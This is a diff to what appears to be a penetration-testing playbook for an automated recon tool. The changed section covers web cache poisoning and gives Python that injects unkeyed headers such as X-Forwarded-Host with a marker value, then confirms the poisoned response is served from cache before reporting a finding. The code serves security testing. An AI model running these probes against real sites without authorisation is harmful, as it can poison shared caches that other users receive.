@@ -326,17 +326,44 @@ for t in redamon.search(method="POST"):
 ## cache — web cache poisoning & hidden inputs (Param Miner, in code)
 
 Unkeyed inputs (headers the cache ignores but the origin reflects) poison a shared
-response. Find them by diffing a reflected marker.
+response. Find them by diffing a reflected marker, then PROVE the poison is SERVED FROM
+CACHE before you report. Reflection alone is NOT poisoning: the value may never be
+cached. This mirrors what the recon cache engine already confirms.
 ```python
+import time
+def served_from_cache(r):
+    # same token set as recon cache_scan oracle.response_cache_state
+    h = {k.lower(): v.lower() for k, v in r.headers.items()}
+    if any(t in h.get("x-cache","")       for t in ("hit","stale")): return True
+    if any(t in h.get("x-cache-status","")for t in ("hit","stale")): return True
+    if "hit" in h.get("cf-cache-status",""):                          return True
+    xv = h.get("x-varnish","").split()
+    if len(xv) >= 2:                                                  return True  # two ids = hit
+    try:
+        if int(h.get("age","0")) > 0:                                return True
+    except ValueError:
+        pass
+    return False
+
 t = redamon.search(path="/")[0]
-base = redamon.replay(t.id, {})
 mark = "rdmn9z1"
 for h in ["X-Forwarded-Host","X-Forwarded-Scheme","X-Host","X-Original-URL",
           "X-Rewrite-URL","X-Forwarded-For","X-Forwarded-Server"]:
-    r = redamon.replay(t.id, {"headers": {h: f"{mark}.evil"}})
-    if mark in r.body and mark not in base.body:
-        print("REFLECTED unkeyed header:", h)                 # cache-poisoning lead
-        redamon.finding("cache-poisoning", t.id, evidence=r, severity="high")
+    cb = f"?rdmncb={mark}{int(time.time())}"          # isolate a fresh cache slot
+    tid = redamon.search(path="/"+cb)[0].id if False else t.id
+    base = redamon.replay(tid, {"path": "/"+cb})
+    poison = redamon.replay(tid, {"path": "/"+cb, "headers": {h: f"{mark}.evil"}})
+    if mark not in poison.body or mark in base.body:
+        continue
+    print("REFLECTED unkeyed header:", h, "-> checking cache-hit")
+    clean = redamon.replay(tid, {"path": "/"+cb})     # NO header, same busted slot
+    if clean is None or getattr(clean, "denied", False):
+        print("  egress guard blocked the send (NOT a not-vulnerable result)"); continue
+    if mark in clean.body and served_from_cache(clean):
+        print("  CONFIRMED served-from-cache poison via", h)
+        redamon.finding("cache-poisoning", tid, evidence=clean, severity="high")
+    else:
+        print("  reflected but NOT served from cache -> not a finding")
 ```
 Hidden-parameter mining: batch many candidate names into one request and diff vs
 baseline; when the response changes, binary-search the batch to isolate the live one
